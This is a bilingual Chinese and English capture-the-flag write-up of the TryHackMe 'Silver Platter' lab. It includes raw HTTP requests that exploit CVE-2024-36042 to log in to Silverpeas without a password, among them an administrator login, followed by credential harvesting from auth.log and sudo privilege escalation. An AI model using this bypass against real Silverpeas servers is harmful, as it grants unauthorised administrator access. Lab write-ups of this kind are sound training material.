# Silver Platter Write-up | 报告

<details>
  <summary>Click to view in Chinese (点击查看中文版)</summary>

---

这是我对 [Silver Platter](https://tryhackme.com/room/silverplatter) 房间的write-up。

# 概述

这是一个CTF挑战题，我们将深入Web服务器，通过SSH寻找隐藏的flag。我们需要找到用户flag和root flag。

# 侦察

获取到IP地址后，我使用Nmap工具扫描了开放端口：

Nmap（Network Mapper）是一款免费、开源的网络扫描工具，用于主机发现、端口扫描、服务检测、操作系统指纹识别和安全审计。

```
nmap -sC -sV MACHINE_IP
```

<img width="833" height="363" alt="image" src="https://github.com/user-attachments/assets/2596132f-2d21-4244-b4f9-6fb1c85ca167" />

我们发现了三个开放端口：**22**（SSH）、**80**（HTTP）、**8080**（HTTP-PROXY）。让我们查看一下Web服务器：

`http://MACHINE_IP:80` 或直接 `http://MACHINE_IP`

<img width="1906" height="867" alt="image" src="https://github.com/user-attachments/assets/2abae469-3812-45c1-956c-c321a051277b" />

这是该公司的网站，我们可以浏览4个选项卡："Intro"、"Work"、"About"和"Contact"。

最有趣的选项卡是"Contact"。

<img width="782" height="218" alt="image" src="https://github.com/user-attachments/assets/1b14c21a-3811-4441-b296-63f923735094" />

现在我们知道了在**Silverpeas**服务上有一个名为"scr1ptkiddy"的用户名。

然后我检查了8080端口：

`http://MACHINE_IP:8080`

<img width="618" height="160" alt="image" src="https://github.com/user-attachments/assets/1957d6b4-09f6-420c-a455-474bccf2216d" />

它返回了一个错误。但这并不意味着没有更多内容。我们知道Silverpeas服务，来看看8080端口是否处理它：

`http://MACHINE_IP:8080/silverpeas`

<img width="1444" height="682" alt="image" src="https://github.com/user-attachments/assets/b52fca72-dd8c-45f3-847b-aeea95942249" />

我们被重定向到了登录页面！我立刻注意到了"Give me a new password"按钮，并使用"scr1ptkiddy"用户名尝试了一下，但没有任何帮助或提示。

我们唯一知道的就是"scr1ptkiddy"这个用户名存在于Silverpeas上。没有更多信息了。我们必须找到该服务的漏洞，以便继续推进。

# 漏洞利用

我在Google上搜索了"silverpeas vulnerabilities"，找到了**CVE-2024-36042 "Silverpeas authentication bypass"**。这正是我们需要的，因为我们有用户名，而这个CVE允许我们在没有密码的情况下登录。

<img width="1458" height="739" alt="image" src="https://github.com/user-attachments/assets/241f60dc-97ae-413c-a8f3-9d459c3b14dc" />

### CVE-2024-36042 描述：
Silverpeas 6.3.5之前的版本存在身份验证绕过漏洞，通过在AuthenticationServlet中省略Password字段，通常可为未经身份验证的用户提供超级管理员权限。

这太完美了。让我们打开Burp Suite，访问 `http://MACHINE_IP:8080/silverpeas`，然后输入用户名"scr1ptkiddy"，在**开启拦截**的情况下点击"LOG IN"，这样我们就能捕获请求并尝试利用该漏洞。

```
POST /silverpeas/AuthenticationServlet HTTP/1.1
Host: 10.48.175.44:8080
Origin: http://10.48.175.44:8080
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
Referer: http://10.48.175.44:8080/silverpeas/defaultLogin.jsp

Login=scr1ptkiddy&Password=&DomainId=0
```

我们需要**删除请求末尾的password字段**，像这样：

```
POST /silverpeas/AuthenticationServlet HTTP/1.1
Host: 10.48.175.44:8080
Origin: http://10.48.175.44:8080
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
Referer: http://10.48.175.44:8080/silverpeas/defaultLogin.jsp

Login=scr1ptkiddy&DomainId=0
```

然后发送请求，再关闭拦截。

现在我们已作为scr1ptkiddy登录到Silverpeas。

<img width="1897" height="691" alt="image" src="https://github.com/user-attachments/assets/0bd7913d-d9da-452c-8578-74cec92875ca" />

# 解决方案

在"**Directory**"选项卡中，我们有三个用户卡片：scr1ptkiddy、Manager和Administrator。在这里我们可以看到Administrator的本地用户：`silveradmin@localhost`。

<img width="1875" height="751" alt="image" src="https://github.com/user-attachments/assets/03983031-05d6-4afd-a6b9-585a6e58ec87" />

我检查了所有目录和消息，但没有找到任何有用的信息。现在我们需要注销，然后尝试以Silver Admin身份登录：

```
POST /silverpeas/AuthenticationServlet HTTP/1.1
Host: 10.48.175.44:8080
Origin: http://10.48.175.44:8080
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
Referer: http://10.48.175.44:8080/silverpeas/defaultLogin.jsp

Login=SilverAdmin&DomainId=0
```
（**用户名中不要使用空格**）

现在我们已经以Administrator身份登录。让我们检查消息……

<img width="1919" height="574" alt="image" src="https://github.com/user-attachments/assets/ca18ab3d-46f2-4d0c-bd6d-74ba7f295ebd" />

在"Mes notifications"中的"Notifications envoyées"选项卡中，我们看到一条带有"SSH"标题的消息。

<img width="636" height="165" alt="image" src="https://github.com/user-attachments/assets/5e2ffaae-c340-4143-bc77-257e11c11025" />

它为我们提供了SSH的用户名和密码。让我们深入进去。

```
ssh tim@MACHINE_IP
```

然后复制粘贴密码。

现在，当我们登录进去后，在 `/home/tim` 中输入 `ls` 找到 `user.txt`。这就是用户flag。

之后我发现了其他用户，如"tyler"、"ssm-user"、"ubuntu"，尝试切换到他们的目录，但没有权限。

<img width="361" height="176" alt="image" src="https://github.com/user-attachments/assets/5f14cf39-9ca0-49bc-ab58-58757e9e1b44" />

我们还可以搜索日志，这可能会非常有用。输入 `ls /var/log`：

<img width="1800" height="144" alt="image" src="https://github.com/user-attachments/assets/88c655ea-7fa0-42b4-9ff7-17214bc5e44a" />

`auth.log` 文件是最有趣的。让我们打开所有文件。

`auth.log.2` 中包含tyler用户的密码，位于DB_PASSWORD字段中。

<img width="1885" height="228" alt="image" src="https://github.com/user-attachments/assets/6acba9fc-7b10-4d9d-8dbd-2c06876f293f" />

让我们切换到tyler，输入 `su tyler` 并复制粘贴我们找到的密码。

让我们通过运行 `sudo -l` 来检查tyler的权限：

<img width="1142" height="171" alt="image" src="https://github.com/user-attachments/assets/609cf64c-d7a3-4e1c-ad90-2d946e3a5975" />

`(ALL : ALL) ALL` 这一行意味着我们拥有完整的管理员权限。我们可以读取任何文件。让我们寻找root的flag：

```
sudo cat /root/root.txt
```

输出结果显示了root的flag。

## 经验教训

在这个房间里，我学到了如何：
* 搜索**CVE漏洞**。

  </details>

---

This is my write-up for the [Silver Platter](https://tryhackme.com/room/silverplatter) room. 

# Overview

This is a CTF challenge where we will dive into the web server to find hidden flags via SSH. We have to find user's flag and root's flag.

# Reconnaissance

After getting an IP address, I scanned it to search for open ports using Nmap tool:

Nmap (Network Mapper) is a free, open-source network scanning tool used for host discovery, port scanning, service detection, operating system fingerprinting, and security auditing.

```
nmap -sC -sV MACHINE_IP
```

<img width="833" height="363" alt="image" src="https://github.com/user-attachments/assets/2596132f-2d21-4244-b4f9-6fb1c85ca167" />

We got three open ports: **22** (SSH), **80** (HTTP), **8080** (HTTP-PROXY). Let's see the web server:

`http://MACHINE_IP:80` or just `http://MACHINE_IP`

<img width="1906" height="867" alt="image" src="https://github.com/user-attachments/assets/5b4fc1c0-2cbf-4e0e-9331-b3599990aad6" />

It's company's site where we can read 4 tabs: "Intro", "Work", "About" and "Contact".

The most interesting tab is "Contact".

<img width="782" height="218" alt="image" src="https://github.com/user-attachments/assets/7674e8d0-d5b4-46aa-8dca-c85c8599be8d" />

Now we know that there's "scr1ptkiddy" username on **Silverpeas** service.

Then I checked port 8080:

`http://MACHINE_IP:8080`

<img width="618" height="160" alt="image" src="https://github.com/user-attachments/assets/17a30992-2d31-4116-bee2-8258304dbaac" />

It returns us an error. But it doesn't mean that there is nothing more. We know about Silverpeas service, let's see if port 8080 handles it:

`http://MACHINE_IP:8080/silverpeas`

<img width="1444" height="682" alt="image" src="https://github.com/user-attachments/assets/19fb0d8c-4454-4d08-b102-5cff1a5f0f6a" />

We're being redirected to login page! I immediately noticed the "Give me a new password" button and used it with "scr1ptkiddy" username, but it didn't give any help or tip.

The only thing we know is that "scr1ptkiddy" username is on Silverpeas. Nothing more. We have to find the vulnerability of this service, that can help us continue.

# Exploitation

I googled "silverpeas vulnerabilities" and found **CVE-2024-36042 "Silverpeas authentication bypass"**. This is exactly what we need, because we have username, and this CVE lets us log in without password.

<img width="1458" height="739" alt="image" src="https://github.com/user-attachments/assets/74b47a78-fbd3-4d13-87bc-975084f64556" />

### CVE-2024-36042 Description:
Silverpeas before 6.3.5 allows authentication bypass by omitting the Password field to AuthenticationServlet, often providing an unauthenticated user with superadmin access.

This is perfect. Let's open Burp Suite and go to `http://MACHINE_IP:8080/silverpeas`, then type "scr1ptkiddy" username and press "LOG IN" with **intercept on**, so we can capture our request and try the vulnerability.

```
POST /silverpeas/AuthenticationServlet HTTP/1.1
Host: 10.48.175.44:8080
Origin: http://10.48.175.44:8080
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
Referer: http://10.48.175.44:8080/silverpeas/defaultLogin.jsp

Login=scr1ptkiddy&Password=&DomainId=0
```

We need to **remove password field at the end of the request** like this:

```
POST /silverpeas/AuthenticationServlet HTTP/1.1
Host: 10.48.175.44:8080
Origin: http://10.48.175.44:8080
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
Referer: http://10.48.175.44:8080/silverpeas/defaultLogin.jsp

Login=scr1ptkiddy&DomainId=0
```

And send it. Then turn the intercept off.

We're now logged in as scr1ptkiddy on Silverpeas.

<img width="1897" height="691" alt="image" src="https://github.com/user-attachments/assets/cbd07378-16f4-40d6-b0f2-c598c809e307" />

# Solution

In "**Directory**" tab we have three cards of users: scr1ptkiddy, Manager and Administrator. Here we can see Administrator's local user: `silveradmin@localhost`.

<img width="1875" height="751" alt="image" src="https://github.com/user-attachments/assets/ce7cca19-b7ff-428d-b9fe-8ea92266c532" />

I checked all the directories and messages but didn't find anything helpful. Now we need to log out and try to log in as Silver Admin:

```
POST /silverpeas/AuthenticationServlet HTTP/1.1
Host: 10.48.175.44:8080
Origin: http://10.48.175.44:8080
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
Referer: http://10.48.175.44:8080/silverpeas/defaultLogin.jsp

Login=SilverAdmin&DomainId=0
```
(**Do not use space in username field**)

Now we're logged in as Administrator. Let's check messages...

<img width="1919" height="574" alt="image" src="https://github.com/user-attachments/assets/8a8e9cab-c441-474e-a019-07652be19296" />

In "Mes notifications", in "Notifications envoyées" tab we see message with "SSH" header.

<img width="636" height="165" alt="image" src="https://github.com/user-attachments/assets/f40865f5-8520-48a8-8e3f-a85ef7c48610" />

It gives us a username and password for SSH. Let's dive into it.

```
ssh tim@MACHINE_IP
```

Then copy n paste the password.

Now, when we're in, in `/home/tim` type `ls` to find `user.txt`. This is user's flag.

After that I found other users, such as "tyler", "ssm-user", "ubuntu", tried to move to their directories, but I don't have permissions.

<img width="361" height="176" alt="image" src="https://github.com/user-attachments/assets/0b744fd1-d1c0-4b03-bbbe-08da5b4fc5e8" />

We also can search for logs, which can be really useful. Type  `ls /var/log`:

<img width="1800" height="144" alt="image" src="https://github.com/user-attachments/assets/d752b5a5-6d58-4ebe-bf8d-2343cf61262e" />

`auth.log` files are the most interesting ones. Let's open all of them.

`auth.log.2` contains tyler's user password in DB_PASSWORD field. 

<img width="1885" height="228" alt="image" src="https://github.com/user-attachments/assets/bd142cc4-882d-4c55-a578-4d75a2a3a125" />

Let's change to tyler, type: `su tyler` and copy n paste the password we found.

Let's check tyler's permissions by running `sudo -l`:

<img width="1142" height="171" alt="image" src="https://github.com/user-attachments/assets/e01f722b-16d0-4ab7-9330-d09f42e75aa2" />

The `(ALL : ALL) ALL` line means we have full administrative privileges. We can read any file. Let's look for root's flag:

```
sudo cat /root/root.txt
```

The output reveals root's flag.

## Lessons Learned

In this room, I learned how to:
* Search for **CVE vulnerabilities**.
